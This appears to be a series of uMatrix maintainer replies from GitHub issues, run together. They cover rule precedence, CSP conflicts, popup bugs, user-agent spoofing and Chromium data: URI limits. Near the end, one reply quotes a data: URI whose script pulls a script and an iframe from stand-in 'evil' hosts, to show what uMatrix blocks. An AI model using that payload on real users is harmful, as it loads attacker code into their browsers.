uMatrix in English.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. > uMatrix 0.9.3.6\nThis was key information not provided in the original bug. This was fixed a long time ago in 83b342d4e4d768d57f1c982d9bf6b673ad35526e. Fix is in dev build, available in development channel on AMO.. Block javascript.\n. Whoever is proactive is free to make a port just like this was done for uBO.\n. You have any user styles?\n. I can't reproduce such issue. There are no other report of such issue. So far this means there is something specific on your side causing this. Only you can investigate to find out what is causing this on your side.\nOne thing you could try is to open the logger, and bring up the popup panel from there. This was you can inspect the DOM using the DOM inspector of the browser, and see what style are applied to the button such that they come out the way they do on your side.\n. > it's weird it only affects some buttons and not others.\nThe buttons left of the reload one have a different style applied to them. The first two are colored according to the currently selected scope (to emphasize they apply to the current scope), while the two others are dimmed if there are no temporary rules. So some themes styles are overriding uMatrix ones.\n. > So, the theme style changes the undefined color, but does not change (not override) the defined color.\n\nProbably the same here?\n\nThis is uMatrix's style for the button:\nbody .toolbar button {\n    ...\n    background-color: white;\n    color: black;\n    ...\n}\n. Fork and try rewrite the core filtering code, it will become obvious why I declined.\n. The popup panel is just normal HTML/CSS/JavaScript, rendered by the browser, and the frame containing it is under control of the browser. The only explanation I can see is that you have a relatively slow CPU.\n. > Also note that this problem only happens with uMatrix extension, and not other extensions \nThe matrix is dynamically build, so the size of the popup (which is not under uBO's control) may change as the matrix is built.\n. Duplicate of #625.\n. > Is this intended behavior?\nYes, because the rule * 1st-party * allow overrides * 192.168.100 * block. The first rule overrides the second one because it is more specific. This is key in uMatrix: narrower rules always override broader ones.\n. > Would you consider amending this behavior?\nNo. I consider any one specific IP address to be 3rd-party to any other IP address.\n\n* google.com * block also blocks e.g., calendar.google.com\n\nBad example. What you are asking is rather like:\n* com * block also blocks e.g., google.com\nIf you want this behavior, remove the rules * 1st-party * allow/* 1st-party frame allow, you will get what you want without the need to introduce arbitrariness in how rules are evaluated in uMatrix.\nAs per your new logic, a rule such as * * * block (which exists by default in uMatrix) would cause all web pages to be blocked, despite the rule * 1st-party * allow.\n. I believe what you actually want is this:\n192.168.100 1st-party * block\n192.168.100 1st-party frame block\nYou can override global 1st-party rules in narrower scopes. The rules above override the broader * 1st-party * allow and * 1st-party frame allow rules.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. The logger should always being looked at, there is no word you did.. I get no issue here using an IPv6 address. Did you try to toggle the per-site switches? Did you look at the logger?. Never mind, this is a duplicate of #597, fixed in dev build.. It didn't work because the issue has nothing to do with rules, it's a Firefox-specific issue which has been fixed in dev build. You can install the dev build from AMO.. Seriously... I say on the front page of the project:\n\nuMatrix does not guarantee that sites will work fine: it is for advanced users who can figure how to un-break sites, because essentially uMatrix is a firewall which works in relaxed block-all/allow-exceptionally mode out of the box: it is not unexpected that sites will break.\n\nIn the current case this is just a matter of adding livechatinc.com cdn.livechatinc.com script allow, or whatever rule will unblock js for livechatinc.com. Use the logger.. > The additional sources that the popup needs to load from are not shown on the original page\nBy design: the popup is a different document from a different web site, merging two different documents from two different web sites into a single matrix does not make sense.. > there is no way to enable them without loading the url in a different tab and then changing them there\nUse he tlogger, the matrix panel is accessible there for any site, just click the second cell in a row entry.. Declined.. This is a browser behavior, by design. Only one extension can modify one request/response header. It's a documented API restriction (and it makes sense if you think about it).. > Also why does it happen randomly\nuBO modfies the CSP header to block websocket/inline script according to filters/rules. uMatrix modifies CSP header to block 1st-party script according to rules, consequently use the loggers of both uBO/uMatrix find out which modified the CSP header of what.. > Will that work ?\nSure. Not blocking 1st-party script with uMatrix would be best, since uBO can both block inline script if needed and websockets where needed, using CSP header.. I could experiment with pushing new CSP header rather than modifying the existing one. As per CSP spec, new CSP policies intersect with existing ones. Would still need to modify existing one to remove report-uri stuff. Anyway, worth experimenting.. > Can that be the cause ?\nyes.. Your * * frame allow rule is causing uMatrix to change CSP headers of loaded frames: an iframe is allowed to load, but no script is allowed to run in the iframe.. The sensible solution is to use narrow global rules for where the players are hosted:\n* thevideo.me * allow\n* thevideo.me frame allow\n\nNow this issue is turning into a support issue. I expect advanced users to understand how to use uMatrix and be able to come up with the proper set of rules.. This issue and proposed fix here is for legacy Firefox, which I no longer maintain.. Not possible, you are dealing with Chromium PDF plugin there. Even trying to block javascript using Chromium's site settings does not work. Browser issue.. > He liked a similar idea: #108.\nThere is no regex involved, it's just a request to support a more flexible syntax, everything is still all the same internally: lookup tables.. I don't care to optimize this, I would never use uMatrix this way.. I am telling you I won't rewrite uMatrix from the ground up, including a yet to define the UI (if possible at all) to support regex-based rules. It's someone else's project, not mine.. > no need to get so defensive and rude about a simple question\nThe essence of your \"simple question\" is to keep arguing about supporting regex/wildcard, something you already know I declined, that is rude:\n\n... I quickly get unmanageable rule list because I can't use regex (or at least some sort of wildcard) ... You said regex is out of the question\n\nLater:\n\n... I would still prefer some sort of wildcard ...\n\nI said it already in the past elsewhere: when I decline a request, please respect that choice.\nThe bottom line is, the more sites one visits on a regular basis, the more rules will be needed. The matrix UI is there to make managing rules easy. If this is not acceptable, then uMatrix is not what you want for your needs.. > ... you just rage-quit ... offended\nNobody is \"rage-quitting\" or \"offended\". This is why I should stick to never comment further when I decline a request, it leads to such nonsensical perception.. There is no issue in uMatrix. Sometimes web sites may break as result of blocking network requests. This is an instance of this.. It's not uMatrix's code doing this, it's the site's code.. Closing and marking as invalid, as per CONTRIBUTING.\n. Duplicate of #96.. I fixed the wiki documentation.\n\nI'm still not sure why matrix: URI {on|off} was changed to matrix-off: URI {true|false}, but it's something I can live with.\n\nOriginally there was only one switch, to control whether matrix filtering was enabled or not. This was changed because more types of switch were added, and in the process I decided that the absence of a switch-based rule would be equivalent to its default state. Matrix filtering's default state is to be enable, hence the need for a matrix-off switch, to override the default state.\nAlso, it's cannot be a URI, it must be a hostname (or IP address).. Adding keywords to uMatrix Chrome means I would have to retrofit a new API in uMatrix Firefox -- which is a pain and really just do not have the time to deal with. Once uMatrix is a proper Firefox WebExtensions, everything will be so much easier to deal with time-wise and effort-wise, as their won't be two different code bases to maintain. In short, keyboard shortcuts can be brought back once uMatrix is Firefox WebExtensions-ready.. There is no UI yet in Firefox to assign keyboard shortcuts.. The old shortcuts that were still there were meant for HTTPSB, and with the refactoring, a lot of these shortcuts no longer made sense. So I am back at deciding which shortcuts are good to have for uMatrix. I don't want a kitchen sink approach, only those shortcuts which make a lot of sense should be available.. uMatrix does not make use of x,y coordinates in its code, it just uses mouseenter/mouseleave events. This means there is a bug in the browser, it generates mousenter/mouseleave events for the wrong hovered elements, you need to report to Google Chrome devs.. I believe this would be the related Chromium issue: https://bugs.chromium.org/p/chromium/issues/detail?id=426656.\nI added the details of the issue here in the Chromium issue: https://bugs.chromium.org/p/chromium/issues/detail?id=426656#c84.. Can't reproduce with latest version.. > Any way that i can Disable the Hosts Files for one Site ?\nNo.\nJust override the block rule with your own rule. Example: youtube.com s.youtube.com * inherit, or broader * s.youtube.com * inherit.. > the problem is that the uMatrix window is too big and cut off in the bottom\nThe browser decide max size of popup panels, extensions have no control/knowledge of this. There is an open chromium issue somewhere about popup panel extending beyond screen size.\nIf I had time, I could create a setting somewhere to set a max height for the body tag, but uMatrix can't hard code any specific size, that would be arbitrary -- many people actually like to see as much as possible at once.. > as the window is way too small\nThere is a separate known issue which affects MacOS + Chrome users. Are you on MacOS?. Did you look at the logger to find out in which context the network requests from the shared worker are fired?. > i know for sure that example.com creats it.\nI do not doubt this. Looking at the logger will tell you how uMatrix sees it.. > Apparently it sees it as behind-the-scene.\nSo there is nothing uMatrix can do -- the browser is not telling it from which tab the network request occurs.\nThe matrix UI can be brought up from the logger, and a behind-the-scene rule can be created from there.. Without an actual repro case, it's unlikely I will care to look into this -- I can't be asked to go on a time-consuming hunt to merely find a test case which should have been provided in opening comment.. > why should WebWorkers receive a different treatment than regular JavaScript ?\nWhy do web workers have their own content security policy directive (worker-src)?\nIf you disagree with uMatrix treating web workers separately than plain javascript (script-src), you may want to also head to https://github.com/w3c/webappsec-csp/issues to express your disapproval.\nThere are already real concrete cases of how being able to block workers independently of 1st-party scripts is beneficial.. @AllanWegan Could be because you have another extension which modifies the CSP header, thus preventing uMatrix from successfully modifying the same CSP header (two extensions can't modify the same response header).. Another possible explanation is that the worker was already allowed to run before you enabled uMatrix. Since the site uses a service worker, it could have been launched before uMatrix was running, and once the service worker is already running, the browser won't try to launch it -- hence can't be caught by uMatrix. Go to chrome://serviceworker-internals/ and shut it down then try again.. It is now possible with both Chromium (63+) and Firefox/webext to reclassify these behind-the-scene network requests so that they are properly filtered. Fixed in https://github.com/gorhill/uMatrix/commit/31cc15ca6cf1b07f23dff30ff83dec8d8135c6ee#diff-e89c0f548b51d6b02baea1e832b9d8ba. Side effect is that the logger may not properly report these \"internally reclassified\" network requests, this will be fixed with #951.. @jjohns71 gave the proper answer above.. > Is there a way to disable just 1 script?\nNo.. Duplicate of #287.. You will have to investigate yourself, I am in no position to investigate this. Aside disabling uMatrix, did you also disable user agent spoofing, referrer spoofing and strict HTTPS switches?. The CSS style of the body element in the popup panel is overflow-y: auto, so the browser should enable the scroll bar if the content's height is larger than the body's height. The iframe in which the popup panel page is embedded is completely controlled by the browser. From what I see, it's as if the iframe's height is not adjusted by the browser to fit the popup panel's height. This is a browser issue, there is no way for uMatrix to know the size of the iframe in which it is embedded, it's under the control of the browser.\n. https://bugs.chromium.org/p/chromium/issues/detail?id=428044. > Same on Firefox 53b\nIs it occasional or always like this? (Can't reproduce on Nightly + 0.9.9b5).. If ever there was a workaround possible, this is not something I am in a position to investigate. Someone with dev skills on MacOS will have to fiddle with HTML/CSS/JS to find out if something can be done to work around the issue.. Best is if someone with dev skills try the workaround, I do not have a mac, I can't test whether that works. Also, this would have to be tested to find out if such workaround affects negatively uMatrix on other platforms.\nedit: ok sorry read too fast, you did test it. Where in the js file did you put the display style toggle code?. Ok how about..\nAdd style=\"display: none;\" in this div, result:\n<div class=\"paneContent\" style=\"display: none;\">\n\nThen add the following line:\ndocument.querySelector('.paneContent').style.removeProperty('display');\n\nAt this point in the source code:\nhttps://github.com/gorhill/uMatrix/blob/master/src/js/popup.js#L1269. The animation is from MacOS, it's completely outside of uMatrix, and probably the browser I suppose.. One thing I am curious about is if the resize event is fired when the popup window size is animated: https://developer.mozilla.org/en-US/docs/Web/Events/resize. Is it something you can verify? Like just adding the code below is see what is reported at the console:\nwindow.addEventListener('resize', function(ev) {\n    console.log(window.innerHeight);\n});. Ok, I would like to understand better by seeing what is reported at the console.\n\nLet's use this line for logging purpose inside the event handler:\nconsole.log(window.innerWidth + 'x' + window.innerHeight, document.documentElement.clientWidth + 'x' + document.documentElement.clientHeight);\n\nLet's use this site as test case (I picked it because it causes the uMatrix popup to need vertical scrollbar when the rows are not collapsed):\n`http://www.tomshardware.com/`\n\nThis is what I get at Chromium dev console after opening the popup and clicking Inspect from within it, verbatim:\n538x600 523x600\n\nI would like to see what is outputted for Chrome on Mac OSX.. Ok, we need to try something else, something which highlights the anomalous state when it occurs. How about replacing document.documentElement with document.body? I get:\n416x208 416x208\n538x600 523x956\n\nEdit: Actually, the fact that the window viewport appears notmal when it's not working suggest we can't use these values to detect the abnormal state.. https://github.com/gorhill/uMatrix/issues/694#issuecomment-275261679. > I can't figure out a way of applying a rule to just the host and not its subdomains. \nNot possible, by design -- it's the core principle of how uMatrix works.. > Can you comment on this?\nThe same precedence logic applies after an update. Rules created from hosts file are as * example.com * block.. > Therefore, I suggest you to change this behavior if that is possible\nDeclined.\nIt just does not make sense in the first place to create a rule such as example.com example.com * allow, so I am not going to spend precious time addressing such a non-issue. Whoever creates such a rule will have to bear the responsibility of whatever negative side-effect such rule can have -- just as is the case for any other rules.. If you fear that anything you allow may become part of a hosts file (which content are not necessarily literally malicious), then don't create permanent rules.\n. In the big picture, open source software developers should not burn themselves out and/or bloat their code base to address ever smaller and questionable worries/requests by ever smaller number of users (up to a single one).. Duplicate of #30.. > So maybe the issue has something to do with rule processing?\nuMatrix merely tells the browser whether to cancel a network request (by evaluating its rules) through the extension API -- it does not care or deal with the content of the document. Your issue is not something I've ever seen, you need to investigate more on your side.. I never experienced such issue, and no such issue was ever reported. Most likely explanation is that something specific on your side external to uMatrix causing this. Any anti-virus? Your ISP messing up the HTTP headers or content? (I noticed your link is not https).. > is u uMatrix not the same version logic as in uBlock?\nYes, not the same scripts to generate the version, these were modernized in uBO to account for beta versions, not so in uMatrix.. Duplicate of #30.. @uBlock-user that is a different issue. The error message reported by OP typically occur on dynamically updated pages after stopping/restarting uBlock Origin without refreshing these page.\nYour case is different, and it occurred to me once while testing uMatrix. If you have repro steps for this one, that would help, as I was not able to reproduce.. Duplicate of #30.. Duplicate of #694.. SeaMonkey 2.46 is based on which version of Firefox?. Related: https://github.com/gorhill/uBlock/issues/1893. Duplicate of #644.. Just use the scope selector to select the scope in which you want the rule to apply.. Just create an allow rule for cookies on drive.google.com: drive.google.com * cookie allow.. > a lot more clicks and time\nGlobal disable: 1 click.\nSelecting global scope and disabling matrix filtering: 3 clicks.\nFor such a rarely used feature, I find 3 clicks vs 1 click to be acceptable, considering that the benefit is that I do not have to throw in new code and UI.\nDeclined.. To reverse it can be one click on the eraser.. Duplicate of #694.. Duplicate of #689.\nAlso, quite likely related to this error emitted at the console:\n\nI will need some repro steps to be able to investigate.. There is sometimes an error in the javascript of the popup, what I need is a way to reliably reproduce it -- I have witnessed it once, but I don't know how to reproduce it. If I can reproduce at will, I can investigate (step into the code) -- it's probably a trivial fix.. > it seems that all of the custom properties on the cells (e.g. hostname and reqType) are lost when the poll handler is called.\nI just reproduced the glitch, and this is what I see happening. In my case it happens with click event, not the poll (setTimeout) event.\nI will try to convert to use attributes as suggested, though the point of using expandos was performance -- much faster to access an expando than using getAttribute.\nEdit: in the end I went with a WeakMap instead of attributes to implement expandos.. Version 0.9.9b5 has been released, please test and see if you can reproduce the issue.. What would help is what the dev console of the extension says, there is no guarantee this is the same issue, it could be a regression from the changes. When this occurs, right click on the panel, click Inspect. This will open the dev console for the popup panel, see what it says.. > same as this - #729 (comment)\nThen you are not using 0.9.9b5 -- what is reported there does not match at all the source code of 0.9.9b5. Please, be as accurate as possible with information about bug, otherwise this causes huge time-wasting for me.. If this still occur, I would really like the output at the dev console.. @blockoperation Thanks for investigating. Given the result of your investigation, I will just go ahead and use attributes, this is what uBO does and that probably explain why it does not suffer the issue. It does look like a Chromium bug since v57. The fix for uMatrix should be simple enough, to just modify expandosFromNode to create/lookup a unique attribute and use it to lookup the object holding the expandos.. There is no issue as per your report. This is not a place for support.. You will need to make a much better report, it's laking the \"make the case\" part -- and lacking a whole lots of details, like all the settings in uMatrix. It's also lacking all the \"ruling out\" steps. Did you rule out that the network requests were made by other extensions? Did you rule out the network requests were from behind-the-scene (for which matrix filtering is not enabled by default)? Etc.\nMake the case -- this forces people to challenge their own conclusions before opening an invalid issue.. I followed your steps 1-3 above, and I could see browser-update.org and googletagmanager.com in wireshark. However I decided to repeat to be sure I did not forget anything, and now I can't reproduce again.\nIf you have other sites with similar steps, that would help.. I could reproduce other instances. Typical output from wireshark:\n10591   9.693043000  localhost => www-googletagmanager.l.google.com  TCP 74 39775 > http [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=1237539 TSecr=0 WS=128\n10594   9.694512000  localhost => browser-update.org                 TCP 74 39741 > http [SYN] Seq=0 Win=29200 Len=0 MSS=1460 SACK_PERM=1 TSval=1237540 TSecr=0 WS=128\n10629   9.760605000  browser-update.org => localhost                 TCP 66 http > 39741 [SYN, ACK] Seq=0 Ack=1 Win=29200 Len=0 MSS=1460 SACK_PERM=1 WS=1024\n10630   9.760633000  localhost => browser-update.org                 TCP 54 39741 > http [ACK] Seq=1 Ack=1 Win=29312 Len=0\n10645   9.779102000  www-googletagmanager.l.google.com => localhost  TCP 74 http > 39775 [SYN, ACK] Seq=0 Ack=1 Win=42540 Len=0 MSS=1430 SACK_PERM=1 TSval=2060224099 TSecr=1237539 WS=128\n10646   9.779126000  localhost => www-googletagmanager.l.google.com  TCP 66 39775 > http [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=1237561 TSecr=2060224099\n14398  14.761331000  localhost => browser-update.org                 TCP 54 39741 > http [FIN, ACK] Seq=1 Ack=1 Win=29312 Len=0\n14414  14.779743000  browser-update.org => localhost                 TCP 54 http > 39741 [FIN, ACK] Seq=1 Ack=2 Win=29696 Len=0\n14415  14.779767000  localhost => browser-update.org                 TCP 54 39741 > http [ACK] Seq=2 Ack=2 Win=29312 Len=0\n14512  15.761213000  localhost => www-googletagmanager.l.google.com  TCP 66 39775 > http [FIN, ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=1239056 TSecr=2060224099\n\nI did check that network.dns.disablePrefetch is set to true and network.prefetch-next is set to false in about:config.\nI further tested and I could reproduce instances while the dev console for the page was opened with the Network tab in \"Persistent log\" mode, and this points out toward a Firefox issue: while wireshark was showing the above, there was no matching instances of connections reported in the Network pane by Firefox. I also tried with the browser console, and same result.\nIn summary, Firefox appears to be establishing connections to these servers without going through its extensions API, or despite the network requests having been cancelled through the extensions API. It also appears to maybe be related to in-memory browser cache -- not sure though.. I can reproduce pretty consistently with Firefox.\nI haven't been able to reproduce with Chromium. This reinforces that this is a Firefox-specific issue.. Duplicate of #330.. What does uMatrix logger says?\nuMatrix won't block anything without a rule telling it to do so. If a blocking rule is creating an issue, then this report is invalid. You make no mention of investigating the logger to confirm that a rule is causing the issue, hence marked as invalid -- most likely explanation is that one of your rule is causing this.. Closing and marking as invalid, as per CONTRIBUTING.\n. uMatrix is not an \"ad blocker\", it's a network request blocker working at hostname- and type-level granularity.. Browser bug: https://bugs.chromium.org/p/chromium/issues/detail?id=693301.\nPrefetching is disabled, it's just the rendering of the button which is incorrect with the new Material Design page.. See chrome://predictors/, select the \"Resource Prefetch Predictor\" tab, it says \"Resource prefetch prediction is disabled\".. > this may merit a separate issue, but how can I enable this feature?\nYou can't with uMatrix. There is no point using uMatrix if it can't guarantee that no connection is made to remote servers for blocked network requests.. uMatrix uses a placeholder image for blocked images. Chromium is seeing that placeholder image, seeing that it is quite small and thus no need to zoom in. In the end, that is just expected from using uMatrix: blocking stuff may break pages, and unblocking may be necessary to unbreak page. That is one such case here.. Just to be clear about what is going on here, a similar issue was opened somewhere in uBO or uMatrix a long time ago.\n\nChrome API request the image as a document, main_frame internally.\nmain_frame are not blocked by uMatrix unless the hostname itself is blocked.\nSo the image is correctly fetched by the browser\nThe browser create a DOM from thin air (no document was really downloaded) and put the downloaded image in it.\nuMatrix's content script looks for blocked images/iframes/etc., to replace them with its placeholder used to visually convey that something was blocked.\nuMatrix finds the image, and evaluate whether it was blocked. It find it was blocked when feeding its URL to uMatrix filtering engine.\nExcept that in reality it was not blocked, because it was downloaded as main_frame, not as image.\nBut the content script does not know that, it's outside of its knowledge, so it uses the placeholder.\n\n\nAll this will be made more obvious if one enables \"Collapse placeholder of blocked elements\".\n\nSo TL;DR: uMatrix's content script does not know the image was downloaded as main_frame and should not be blocked. It's a quirky edge case of the chrome API -- there is not link between webRequest API and DOM elements.. Duplicate of #686.. > Secondly, in All it shows \"request not processed\"\nI just checked, and it means that uMatrix is hard-coded to deal only with http[s]:requests, I need to change this to deal with ws[s]: as well.. Duplicate of #711.. Any error at the extension's dev console?. Never mind, I just reproduced. I can confirm this is duplicate of #711.. Forgot to check in manifest.json, I will regenerate the tag.\n. Closing and marking as invalid, as per CONTRIBUTING.\n. @uBlock-user I did not mark the extension as being compatible with Firefox mobile, making the UI works on mobile does not look like small amount of work, and I have no time for this at this point.. @dragetd Something is wrong with the mobile version of AMO then. Firefox for Android is not listed in install.rdf, and not a valid target for uMatrix on AMO -- searching \"umatrix\" with https://addons.mozilla.org/en-US/android/search/?q=umatrix returns nothing.. This requires to turn uMatrix into a completely different extension.. Just select the scope you want for your rules using the scope selector. * stands for global scope.. Closing as invalid, it's as if you did not read CONTRIBUTING or chose to completely dismiss it. It's impossible for me to say anything since you do not provide any details about your relevant ruleset. I will re-open if you submit a proper issue report with all relevant details and step-to-reproduce as asked in CONTRIBUTING.. You have user styles interfering?. I can't reproduce (Pale Moon 27.1.0), you will have to investigate what causes this on your side.. I still can't reproduce with layers.async-pan-zoom.enabled set to true.. No requests accepted for uMatrix, I barely have time to keep it up to date with changes in browsers.\nYou can already bring up the matrix UI from the logger.. Just use the matrix to create a rule which removes the block.\nClosing as invalid, as there is no issue with uMatrix, and anyways you did not provide any steps-to-reproduce to at least be given a hint on how to deal with your issue. Probably this will answer your case: https://github.com/gorhill/uMatrix/issues/203#issuecomment-190795113.. > is there a plan to implement a feature like that?\nNo.. CONTRIBUTING:\n\nDo not open feature requests. I just do not have the time.. What is \"all\" tab?\n\nYou did not provide your version of uMatrix.. @stade5000 There is a known issue with uMatrix 0.9.3.4 and recent versions of Chromium, see #711. This has been fixed in uMatrix 1.0.0. I need to upload this version to Opera store.. I will try to do better.. You need to investigate why the network request does not complete on your side. I see no such investigation on your side. Did you look in the logger? Did you try with no other extension installed? Is there anything else in your environment which may cause the issue? Was it just a transient issue with the server? Etc. You will need to investigate this yourself, I can't reproduce, and so far you are the only one reporting such issue.. This is the request headers sent on my side:\n\nNotice the Accept header: */*.\nOn your side, it seems your Accept header is text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8.\nCan you confirm with the browser console as I did above?\n. If you want to use uMatrix's dev build, install from AMO: https://addons.mozilla.org/en-US/firefox/addon/umatrix/versions/beta.\nStill, I can install on Nightly by just dragging the xpi file into about:addons. Is your about:config setting xpinstall.signatures.required set to false?. > uMatrix and uBlockO magically stopped working (without any explanation or visible message whatsoever)\nThere was a breaking change in Nightly, see https://github.com/gorhill/uBlock/issues/2493 and https://github.com/gorhill/uBlock/issues/2505. Fixed in dev versions.. No doubt the bug is detrimental to uMatrix, but I just can't hastily push a version for which there is so much code changes since last version:\n\nShowing  102 changed files  with 4,175 additions and 3,728 deletions.\n\nI need to be convinced this has all been tested to be sure there is no major regression -- I am the one who will be on the receiving end. I have absolutely no idea how many people are actually using the dev build, so to compensate for this I just wait for enough time to have passed with no new issues opened to be confident a new stable can be released.. Look at #711. My last commit is marked as \"need confirmations\". Not a peep since then.. Make the case why 15 minutes is an issue -- just saying so does not make the case. The 15 minutes has been picked because this is how often uBO polls internally, there would be no point going lower.. Is that MacOS?. Duplicate of #694.. uMatrix version please.. Install the dev build from AMO, changes in Nightly broke the stable version.\nThis was fixed with 89c5f02d.. Why open a duplicate issue? Someone will have to port to Edge the same way uBlock Origin was ported.. No browser name/version provided, no uMatrix version provided.. > Like I said, it was mentionned there.\nI should not be asked to go hunting elsewhere for such basic information.\n\nBy the word Mozilla, I refer to Firefox\n\nNightly is not Firefox. Developers need exact information, not be asked to guess.\nSo far you are the only one reporting such an issue with uMatrix 0.9.9b12 + Firefox 52. Look in the browser console (ctrl-shift-j)  if there are any error which could be related when the issue occurs. \n\ncan discover the cause via one software like WhatIsHang, etc ?\n\nuMatrix is not an application, it's an extension written using HTML/CSS/JS, all the diagnosing must be done through the browser dev tools. If the browser crashes, it's a browser issue, as HTML/CSS/JS is not supposed to crash the browser.. There is no media type in uMatrix, internally the media column maps to plugin. For backward compatibility sake, I can't just rename plugin to media.. I don't like this discrepancy. A solution is to internally create a new media type, and make plugin obsolete and map it to media when encountered.. There is no version 1.12.0, that does not exist.. Duplicate of #756.\nPlease search existing issues before opening a new one.. \n. I could reproduce when I drag-n-dropped the xpi file into Nightly. However I can't reproduce once I restart the browser.\nNever mind, it happens kind of randomly apparently.. I can't reproduce when starting Nightly.\nI can reproduce all the time when disabling then enabling uMatrix/webext. There are no errors reported at the browser console. uBO/webext does not suffer the issue.. Spotted at bugzilla: blank browserAction with extensions.webextensions.remote=true.. Front page of the project: Regarding broken sites.\nClosing and marking as invalid, as per CONTRIBUTING.\n. @Atavic uMatrix will render hostnames as Unicode when they are punycoded. If apple.com is a 3rd-party in the matrix, the browser won't be of any help there, it's for uMatrix to provide at least some way for the user to understand that apple.com is not apple.com -- the browser is not involved in rendering anything in the matrix.. That's the plan, as usual, it's a matter of finding the time to do this.. Browser crashes must be reported to browser devs. uMatrix is just HTML/CSS/JS, this is not supposed to crash a browser.. Browser version?. Duplicate of #694 -- specific to OSX.. Closing and marking as invalid, as per CONTRIBUTING.\n. To be clear, uMatrix/uBO themselves do not expose chrome:/resource: URIs to web pages -- so they should not be affected by whether these URIs are blocked or not.. > Sorry, I didn't mean to imply uMatrix or uBo were leaking resources\nSure, it's just me wanting to be sure there is no misunderstanding for whoever reads this here -- since according to OP, disabling uMatrix fixed his issue (no case was made that uMatrix is doing something wrong, so the assumption is that the issue is with his ruleset).\n. Just use the dev build on AMO, it's pretty much always ahead of stable or at least essentially the same (stable is last rc? build on dev channel).. Did you try to just click on the rule in the matrix -- like you would do for any rule you created yourself?. Nowhere does the doc say that rules from hosts files \"trump everything\", it says:\n\nAll hostnames in selected hosts files are interpreted as blacklisted hostnames in the global scope, so they propagate to narrower scopes just like in HTTPSB.\n\nMy comment above:\n\nDid you try to just click on the rule in the matrix -- like you would do for any rule you created yourself?\n\nDid you? There is no special trick with document blocked by hosts file rules, just like any other un-breaking operation, you open the matrix panel, click on the rule which you want to change, force reload to see if it works, then persist if you like the result.. You don't have to create a global rule for this case, example.com example.com * inherit will work just fine -- assuming example.com was listed in one of the hosts files -- or more simply just clicking on blocked example.com in the matrix panel.. I made the wiki available to edit by all, just go ahead and add what you want. Thanks in advance.. Thanks, I've added your page to a special entry on the wiki home page. Given that there are many ways to use uMatrix, I just put a warning that I may or may not agree on whether this is an optimal way of using uMatrix. Regardless, these are welcome as I just do not have the time to create full-blown doc.. Unable to reproduce. Your report lacks information and detailed step-to-reproduce, so I went with my own steps:\n\nUsing Linux, Firefox Nightly, uMatrix 1.0.0.\nAdded Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0 to the list of user agent strings in the Privacy panel, commented out all other strings.\nSet dom.storage.enabled to false in about:config.\nOpened https://mega.nz/ in a new tab.\nEnsured that the switch \"User agent spoofing\" is enabled for that site.\n\nResult, the site thinks I am using Firefox 45 on Windows:\n\nI will reopen if you make a better case that there is an issue. You failed to:\n- provide OS/Browser/uMatrix version\n- provide which user agent strings you are using for spoofing\n- provide assurance that you actually verified that spoofing is enabled\n- provide other information as to whether other extensions/browser settings may be interfering\n- provide detailed steps to reproduce\n. Somebody else will have to investigate -- I can't investigate if I can't reproduce.\nI suggest you use another user agent spoofing extension meanwhile.. Ok, I reproduce on FF53. Strangely, I can't reproduce on Nightly.. The site's Content Security Policy does not allow inline script tags, this means uMatrix inline script tag to spoof window.navigator is not allowed to execute.\nUnexpectedly, uMatrix's inline script works with Nightly. It's unclear whether this is by design or not, maybe Nightly allows inline script injected by extensions? (would make sense since they are trusted by the user).. I have a fix, but it's best called a \"mitigation\", it will work for this site, but there is no guarantee it will work for some other sites where there is a similar issue. It will work for this site because I created a fallback to data: URI to inject the script.\nBut in the end, the reality is that I am seriously considering removing UA spoofing, it gives a false impression of accomplishing somethign useful. Turns out countering fingerprinting has become quite an undertaking, and partially spoofing some navigator entries does not accomplish much -- I rather remove this clumsy feature borne out of experimental code years ago before I understood fully all that was at stake.\nSee for yourself using dev console, inspect window.navigator for whichever site for which the UA spoofer seems to work. You will see other entries in there not touched by uMatrix and which contradict entries touched by uMatrix.\nIn the end, UA spoofing and all other anti-fingerprinting mechanisms are best left to a specialized extension, and that will require a lot of work, this does not belong to a network request firewall like uMatrix.. > No.Please. Don`t remove UA Spoofing.\nIt does not really prevent finding out which browser/OS you are using -- I rather remove it than mislead users into thinking the opposite. At the very least, the feature needs to be somewhere else than in the Privacy pane in the dashboard.. The fix is in v1.0.1b0 on AMO dev channel.\n. @Atavic Here is about user agent spoofing, what you linked to is about referrer spoofing. Can you open a new issue for this, with a reference to the blog post arguing why stripping out is better?. You have to provide evidence to support there is an issue, all details, step-to-reproduce, logger output, etc.. With such evidence, no point opening an issue. I will re-open if and only if you provide repro steps for anybody to reproduce, or at the very least convincing gathered details demonstrating the issue. For instance, did you look into the strict https switch?. After reading the blog post, it does seem to me that uMatrix could treat non-GET requests differently for referrer-spoofing purpose: remove the Referer header instead of spoofing it -- keeping in mind that uMatrix spoof the referrer only when it is 3rd-party to the navigated-from site, so the referrer header would not be removed if it is 1st-party.. > I made this simple hosts file\nThat is not a valid hosts file format, these are uMatrix rules. uMatrix rules are not hosts file entries. You cannot load uMatrix rules from a remote resources, you have to import them in My rules.. This is a limitation known and documented for years, \"The exception: Data URI\":\n\nIn Chromium-based browsers, loading a data URI in the address bar doesn't result in HTTP headers being received through a chrome.webRequest.onHeadersReceived event handler, therefore no Content-Security-Policy \"script-src 'none'\" header can be injected, thus inline javascript cannot be disabled for data URIs. [7] [...]\nNow, I just want to emphasize that data URIs for Chromium-based browsers are treated quite differently than other browsers:\nIn a Chromium-based browser, a data URI is its own unique origin, and as per Chromium developers, \"they don't have access to cookies or other resources belonging to their parent\". [8]\nFurthermore, if [uMatrix] is present, external resources referenced in a data URI, and which are not whitelisted won't be allowed to load.\nThis mitigates significantly the execution of javascript code in a data URI, and I do not consider this enough of an issue to for [uMatrix] to deserve the \"unreliable\" tag.\n\nIncidentally, I found that your proof-of-concept does not on Chromium 60, the browser refused to navigate to a data: URI from an http: one:\n\n. Just to illustrate the part where I say:\n\nFurthermore, if [uMatrix] is present, external resources referenced in a data URI, and which are not whitelisted won't be allowed to load.\n\n\ndata:text/html,<script>var el=document.createElement('script');el.src=\"http://evil-script.exploit\";document.documentElement.appendChild(el);el=document.createElement('iframe');el.src=\"http://evil-iframe.exploit\";document.documentElement.appendChild(el);</script>\n. > I guess there is no such limitation in latest Nightly+uMatrix WebExtension?\nI just checked and the 